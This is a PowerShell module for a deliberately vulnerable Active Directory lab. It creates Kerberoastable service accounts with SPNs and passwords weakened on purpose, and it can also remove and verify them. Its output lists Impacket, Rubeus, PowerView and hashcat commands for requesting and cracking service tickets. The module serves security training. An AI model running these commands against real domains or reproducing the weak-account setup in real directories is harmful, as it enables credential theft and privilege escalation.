#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests Kerberoasting attack scenarios in a vulnerable Active Directory lab.

.DESCRIPTION
    This module creates service accounts with weak Service Principal Names (SPNs) that are
    vulnerable to Kerberoasting attacks (MITRE ATT&CK T1558.003). Three service accounts are
    provisioned with SPNs for MSSQL, CIFS, and HTTP services, using passwords scaled to the
    selected difficulty level.

    Kerberoasting exploits the Kerberos TGS ticket-granting mechanism: any authenticated domain
    user can request a service ticket for any SPN-registered account, then crack the ticket
    offline to recover the service account password.

.NOTES
    Module:     VulnAD - Kerberoasting
    Author:     VulnAD Project
    Requires:   ActiveDirectory module, VulnAD-Core.ps1 helpers
    MITRE ID:   T1558.003
#>

function Deploy-Kerberoasting {
    <#
    .SYNOPSIS
        Deploys Kerberoasting-vulnerable service accounts with registered SPNs.

    .DESCRIPTION
        Creates three service accounts (svc_mssql, svc_backup, svc_web) in the
        ServiceAccounts OU with associated Service Principal Names. Password strength
        scales with the chosen difficulty level.

    .PARAMETER Difficulty
        Attack difficulty level: Easy (weak passwords), Medium, or Hard (strong passwords).

    .PARAMETER DomainDN
        Distinguished name of the domain (e.g., DC=contoso,DC=com).

    .PARAMETER Domain
        FQDN of the domain (e.g., contoso.com).

    .EXAMPLE
        Deploy-Kerberoasting -Difficulty Easy -DomainDN 'DC=vulnlab,DC=local' -Domain 'vulnlab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying Kerberoasting scenario ($Difficulty difficulty)" -Type Info

    $createdObjects = [System.Collections.Generic.List[string]]::new()

    # Define service accounts with their SPNs
    $serviceAccounts = @(
        @{
            SamAccountName = 'svc_mssql'
            Name           = 'MSSQL Service Account'
            Description    = 'SQL Server service account - Kerberoasting target'
            SPN            = "MSSQLSvc/db01.$($Domain):1433"
            PasswordIndex  = 0
        },
        @{
            SamAccountName = 'svc_backup'
            Name           = 'Backup Service Account'
            Description    = 'Backup service account - Kerberoasting target'
            SPN            = "CIFS/backup01.$Domain"
            PasswordIndex  = 1
        },
        @{
            SamAccountName = 'svc_web'
            Name           = 'Web Application Service Account'
            Description    = 'IIS application pool identity - Kerberoasting target'
            SPN            = "HTTP/web01.$Domain"
            PasswordIndex  = 2
        }
    )

    foreach ($svcAcct in $serviceAccounts) {
        try {
            $password = Get-VulnPassword -Difficulty $Difficulty -Index $svcAcct.PasswordIndex

            # Create the service account in the ServiceAccounts OU
            $user = New-VulnUser -SamAccountName $svcAcct.SamAccountName `
                                 -Name $svcAcct.Name `
                                 -Password $password `
                                 -DomainDN $DomainDN `
                                 -Description $svcAcct.Description `
                                 -ServiceAccount

            if ($user) {
                # Register the Service Principal Name on the account
                Set-ADUser -Identity $svcAcct.SamAccountName -ServicePrincipalNames @{Add = $svcAcct.SPN}
                $createdObjects.Add("User: $($svcAcct.SamAccountName) (SPN: $($svcAcct.SPN))")

                Write-VulnResult -Name $svcAcct.SamAccountName `
                                 -Detail "Created with SPN $($svcAcct.SPN)" `
                                 -Success $true
            }
        }
        catch {
            Write-VulnResult -Name $svcAcct.SamAccountName `
                             -Detail "Failed: $($_.Exception.Message)" `
                             -Success $false
            Write-VulnStatus -Message "Error creating $($svcAcct.SamAccountName): $($_.Exception.Message)" -Type Error
        }
    }

    # Mark the last result for output formatting
    if ($createdObjects.Count -gt 0) {
        Write-VulnResult -Name 'Kerberoasting' -Detail "Deployed $($createdObjects.Count) service accounts" -Success $true -IsLast
    }
    else {
        Write-VulnResult -Name 'Kerberoasting' -Detail 'No accounts were created' -Success $false -IsLast
    }

    return @{
        Scenario       = 'Kerberoasting'
        Description    = @(
            'Kerberoasting abuses Kerberos TGS tickets to extract service account credentials.',
            'Any authenticated user can request a service ticket for SPN-registered accounts,',
            'then crack the ticket offline. Weak service account passwords are trivially recovered.'
        ) -join ' '
        CreatedObjects = $createdObjects.ToArray()
        AttackCommands = @(
            "# Impacket - Remote Kerberoasting (no domain-joined machine needed)",
            "impacket-GetUserSPNs $Domain/<username>:<password> -dc-ip <DC_IP> -request",
            "",
            "# Rubeus - Local Kerberoasting from domain-joined host",
            "Rubeus.exe kerberoast /outfile:hashes.kerberoast",
            "Rubeus.exe kerberoast /user:svc_mssql /outfile:svc_mssql.hash",
            "",
            "# PowerView - PowerShell-native enumeration and roasting",
            "Get-DomainSPNTicket -SPN 'MSSQLSvc/db01.$($Domain):1433'",
            "Get-DomainUser -SPN | Get-DomainSPNTicket | Export-Csv -Path tickets.csv",
            "",
            "# Hashcat - Crack extracted TGS hashes",
            "hashcat -m 13100 hashes.kerberoast /path/to/wordlist.txt"
        )
        AttackPath     = @(
            "Authenticated User",
            "  -> Request TGS for SPN-registered service accounts",
            "  -> Extract ticket (RC4/AES encrypted with service account password hash)",
            "  -> Offline brute-force / dictionary attack on ticket",
            "  -> Recover plaintext service account password",
            "  -> Lateral movement / privilege escalation with service account"
        ) -join "`n"
        MitreID        = 'T1558.003'
        Difficulty     = $Difficulty
    }
}

function Remove-Kerberoasting {
    <#
    .SYNOPSIS
        Removes all Kerberoasting scenario objects from Active Directory.

    .DESCRIPTION
        Deletes the service accounts created by Deploy-Kerberoasting.
    #>
    [CmdletBinding()]
    param()

    Write-VulnStatus -Message 'Removing Kerberoasting scenario objects' -Type Info

    $accounts = @('svc_mssql', 'svc_backup', 'svc_web')

    foreach ($account in $accounts) {
        try {
            $adUser = Get-ADUser -Identity $account -ErrorAction Stop
            Remove-ADUser -Identity $adUser -Confirm:$false
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Removed successfully' -Success $true -IsLast:$isLast
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Not found (already removed)' -Success $true -IsLast:$isLast
        }
        catch {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail "Removal failed: $($_.Exception.Message)" -Success $false -IsLast:$isLast
            Write-VulnStatus -Message "Error removing $($account): $($_.Exception.Message)" -Type Error
        }
    }
}

function Test-Kerberoasting {
    <#
    .SYNOPSIS
        Validates that the Kerberoasting scenario is correctly deployed.

    .DESCRIPTION
        Checks that all service accounts exist and have their expected SPNs configured.

    .PARAMETER Domain
        FQDN of the domain for SPN validation.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Domain
    )

    Write-VulnStatus -Message 'Testing Kerberoasting scenario deployment' -Type Info

    $expectedSPNs = @{
        'svc_mssql'  = "MSSQLSvc/db01.$($Domain):1433"
        'svc_backup' = "CIFS/backup01.$Domain"
        'svc_web'    = "HTTP/web01.$Domain"
    }

    $allPassed = $true

    foreach ($entry in $expectedSPNs.GetEnumerator()) {
        try {
            $adUser = Get-ADUser -Identity $entry.Key -Properties ServicePrincipalNames -ErrorAction Stop
            $hasSPN = $adUser.ServicePrincipalNames -contains $entry.Value

            if ($hasSPN) {
                Write-VulnResult -Name $entry.Key -Detail "SPN '$($entry.Value)' is set" -Success $true
            }
            else {
                Write-VulnResult -Name $entry.Key -Detail "User exists but SPN '$($entry.Value)' is MISSING" -Success $false
                $allPassed = $false
            }
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name $entry.Key -Detail 'User does NOT exist' -Success $false
            $allPassed = $false
        }
        catch {
            Write-VulnResult -Name $entry.Key -Detail "Test error: $($_.Exception.Message)" -Success $false
            $allPassed = $false
        }
    }

    Write-VulnResult -Name 'Kerberoasting' `
                     -Detail $(if ($allPassed) { 'All checks passed' } else { 'Some checks FAILED' }) `
                     -Success $allPassed -IsLast

    return $allPassed
}

Export-ModuleMember -Function Deploy-Kerberoasting, Remove-Kerberoasting, Test-Kerberoasting
